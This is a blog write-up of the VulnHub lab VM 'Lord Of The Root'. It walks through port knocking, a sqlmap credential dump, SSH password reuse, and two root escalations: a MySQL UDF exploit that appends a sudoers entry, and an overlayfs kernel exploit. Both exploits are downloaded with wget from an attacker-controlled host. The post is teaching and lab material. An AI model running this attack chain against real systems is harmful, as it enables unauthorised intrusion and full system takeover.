<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>à¤®à¤‚à¤¥à¤¨ | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>à¤®à¤‚à¤¥à¤¨</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] Lord Of The Root: 1.0.1</h1><p><a href=/posts/20191010_vulnhub-linsecurity1.html> Â« </a>ðŸ“… published on <code>10/Oct/2019</code><a href=/posts/20191011_vulnhub-misdirection1.html> Â» </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/lord-of-the-root-101,129/ >Lord Of The Root: 1.0.1</a>. Here's an overview of the <code>enumeration</code> â†’ <code>exploitation</code> â†’ <code>privilege escalation</code> process:</p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_lordoftheroot101/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>1337/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href=https://github.com/7h3rAm/writeups#exploit_sqli>exploit_sqli</a>, <a href=https://github.com/7h3rAm/writeups#exploit_credsreuse>exploit_credsreuse</a>, <a href=https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs>privesc_kernel_overlayfs</a>, <a href=https://github.com/7h3rAm/writeups#privesc_mysql_root>privesc_mysql_root</a>, <a href=https://github.com/7h3rAm/writeups#privesc_mysql_udf>privesc_mysql_udf</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
Nmap scan report for 192.168.92.151
Host is up, received arp-response (0.00035s latency).
Scanned at 2019-10-10 14:06:39 PDT for 5s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJKVpy10olbGC8nI2MWPTGKXhT6VsZcRnCAjQhqcpe8hLZ4cXu33YaLzgHJF1cm0ebDTZNP55kkYx8iQLw4izWfw21R45GWEuFLa6gX7wsygffXlSP0jlGbnspYWZj9FkbqN8GOFnUsqvCDCcXDe69OlxGPhBiMxB1rxuoUZnxPZAAAAFQCDbd7sa658iDpIzFLRsbyEkgmvQwAAAIA4myZvSg9MIJQoio8r7Pu2Z7de6aMg6dooumuVPfbsvcb1ZpcnU1nnBcJe5sSof/eIZSqh+NFl3r04rVcNmEMNP+7liXhjGAQ4G0c95vAN+12V12vHdk2YXEO4Mj/VhQxI1AP/5XdiY4OI7vDVY6FGw+4gR+aarZIDjY67jpl//QAAAIAvQVESJOOiTImUdavfNImDDFo/8Ttw0Iq9OcAwuE3umJ6PSfjcTq5IODKQ1hHr8Qb/+7Q6+osumyd6ONOIuM9x8sWExOAlWrcGkZszDzBUb4tjWXdliHuxYds+qZjl3esaKbeW5v97Zf5RPYeUv7cWWxThqbVNehp+fsxAmhMhgw==
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZnR9vNmnhJVAXLzEz9KbyuNunmOeZLgWAvEXrYL5PQUSnjV6r9quuRtcjxs26JAMkSr2GH0r8JEhYKQQBMdGe7j/qfN5gorUOykWv1R3v+4Blu5L4R+8v7pFrQnu7IrAbms9fOiiF0nCWs6dugDQ+4rBl+90WHbJ40s5f9L1akGBpYmuuT9gy7ULabvc6CYZ2+cCFVpkf/s8rc3z3OV0W5JNoENyXtyvuirQqQ4+xLVlyPFpBfmqx1mY1XOeY7qqN99/82Ti9JfNJwjWgINGTY0wWGuWJdYrxAiyL/F9/MPJyb/zEM9I2/ne+qUrJ1Jkpcl4eJ42UV7HUkUGpZXkb
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFoWH4DDWVRbA1EqnCjoMMCx5bR9hiI5qTJIi+LGY9kWZQU4Y4D+MJQRoDBVd/ijYLAQ1HvW/MZIpjRCfUON6uU=
|   256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK8+Q9UBYlSuxYmR6fYF4W8Vv22fP15QxiCfpGk8JV2+
MAC Address: 00:0C:29:97:85:0D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 10 14:06:44 2019 -- 1 IP address (1 host up) scanned in 5.59 seconds
</code></pre><p class=nested>2. We just have 1 open port, <code>22/tcp</code> and start there. Upon connecting we see a banner that hints at port knocking sequence <code>1,2,3</code>. We knock on these ports and find a new port, <code>1337/tcp</code>, open up on the target system: </p><pre class=nested><code>ssh root@192.168.92.151
                                                    .____    _____________________________
                                                    |    |   \_____  \__    ___/\______   \
                                                    |    |    /   |   \|    |    |       _/
                                                    |    |___/    |    \    |    |    |   \
                                                    |_______ \_______  /____|    |____|_  /
                                                            \/       \/                 \/
   ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
  |    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
  |      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
  |    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
  |____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
          \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
  Easy as 1,2,3
  root@192.168.92.151's password:

knock 192.168.92.151 1,2,3
  PORT     STATE SERVICE
  22/tcp   open  ssh
  1337/tcp open  waste
</code></pre><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.2.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.2.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png.webp> </p><p class=nested>3. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the <code>robots.txt</code> page. Upon decoding it twice we find a directory path which leads to a login form: </p><pre class=nested><code>http://192.168.92.151:1337/robots.txt
  THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh

b64d THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
  Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

b64d Lzk3ODM0NTIxMC9pbmRleC5waHA=
  /978345210/index.php
</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp    |  ssh   |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
1337/tcp  |  http  |  Apache httpd 2.4.7 ((Ubuntu))
</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Files</h4><pre class=nested><code>http://192.168.92.151:1337/robots.txt
http://192.168.92.151:1337/978345210/index.php
</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>ssh: smeagol
webapp: frodo, smeagol, aragorn, legolas, gimli
</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users: </p><pre class=nested><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png.webp> </p><p class=nested>2. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user <code>smeagol</code> has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system: </p><pre class=nested><code>ssh smeagol@192.168.92.151
</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>smeagol@LordOfTheRoot&gt; id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
smeagol@LordOfTheRoot&gt;  
smeagol@LordOfTheRoot&gt; uname
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
smeagol@LordOfTheRoot&gt;  
smeagol@LordOfTheRoot&gt; ifconfig
eth0  Link encap:Ethernet  HWaddr 00:0c:29:97:85:0d
      inet addr:192.168.92.151  Bcast:192.168.92.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fe97:850d/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:1436389 errors:39 dropped:110 overruns:0 frame:0
      TX packets:691018 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:114236583 (114.2 MB)  TX bytes:109580367 (109.5 MB)
      Interrupt:19 Base address:0x2000
smeagol@LordOfTheRoot&gt;  
smeagol@LordOfTheRoot&gt; users
root
smeagol
</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps: </p><pre class=nested><code>cd /var/www
grep -nir mysql ./
</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png.webp> </p><p class=nested>2. We find that <code>mysql</code> is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for <code>lib_mysqludf_sys.so</code> file on the target system. This file is not found so we have to use an exploit to create one and use it from <code>mysql</code> shell (using credentials found in previous step): </p><pre class=nested><code>ps aux | grep -i mysql
locate lib_mysqludf_sys.so
cd /tmp
wget http://192.168.92.183:9999/1518.c
</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png.webp> </p><p class=nested>3. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the <code>mysql</code> shell, load the shared object and map it to a custom function called <code>do_system</code>. This function can now be used to execute commands from within <code>mysql</code> shell with elevated privileges. We run a command to give all permissions to user <code>smeagol</code>: </p><pre class=nested><code>gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
mysql -u localhost -u root -p
  use mysql;
  create table foo(line blob);
  insert into foo values(load_file('/tmp/1518.so'));
  select * from foo into dumpfile '/usr/lib/1518.so';
  create function do_system returns integer soname '1518.so';
    ERROR 1126 (HY000): Can't open shared library '1518.so' (errno: 0 /usr/lib/mysql/plugin/1518.so: cannot open shared object file: No such file or directory)
  select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
  create function do_system returns integer soname '1518.so';
  select do_system('echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers');
</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.3.4 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png.webp> </p><p class=nested>4. We can now exit from the <code>mysql</code> shell, check for user <code>smeagol</code>'s <code>sudo</code> privileges and switch to user <code>root</code>: </p><pre class=nested><code>sudo -l
</code></pre><p class=nested><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png.webp> </p><p class=nested>5. Another way to gain elevated privileges is to run the <code>overlayfs</code> exploit on the target system because it has a kernel compiled before <code>2015-12-26</code>: </p><pre class=nested><code>cd /tmp
wget http://192.168.92.183:9999/39166.c
gcc -o 39166 39166.c
./39166
</code></pre><p class=nested><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.5.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png.webp> </p><p class=nested>6. Once we have elevated privileges, we can view the contents of the <code>/root/Flag.txt</code> file to complete the challenge: </p><pre class=nested><code>cat /root/Flag.txt
</code></pre><p class=nested><img alt=writeup.privesc.steps.6.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5........................
</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>webapp: frodo/iwilltaketh....., smeagol/MyPreciou....., aragorn/AndMyS...., legolas/AndM...., gimli/AndMy...
mysql: root/darksha...
ssh: smeagol/MyPreciou.....
</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/lord-of-the-root-101,129/ >https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a> </li><li><a href=https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README>https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README</a> </li><li><a href=https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html>https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html</a> </li><li><a href=http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html>http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html</a> </li><li><a href=https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/ >https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/</a> </li></ul><p style=text-align:center;>(ðŸ”– tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>Â« <a href=/posts/20191010_vulnhub-linsecurity1.html>[VulnHub] Lin.Security: 1...</a> Â« | Â» <a href=/posts/20191011_vulnhub-misdirection1.html>[VulnHub] Misdirection: 1...</a> Â»</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>